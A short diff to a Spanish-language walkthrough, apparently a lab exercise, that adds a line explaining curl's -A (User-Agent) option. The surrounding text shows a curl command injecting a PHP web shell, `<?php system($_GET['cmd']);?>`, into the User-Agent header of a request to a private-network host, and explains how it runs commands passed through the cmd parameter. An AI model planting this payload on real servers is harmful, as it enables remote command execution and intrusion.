@@ -131,6 +131,7 @@ curl http://172.17.0.2/ -A "<?php system(\$_GET['cmd']);?>"
 
 Aquí, el código PHP `<?php system(\$_GET['cmd']); ?>` hace lo siguiente:
 
+--A (o --user-agent) define el valor de la cabecera User-Agent que enviamos en la petición HTTP
 - `system()` es una función de PHP que ejecuta un comando en el sistema operativo.
 - `\$_GET['cmd']` toma el valor del parámetro `cmd` que se pasa en la URL.
 - Así, cuando se accede a la URL con `&cmd=algún_comando`, el servidor ejecuta ese comando y muestra la salida.
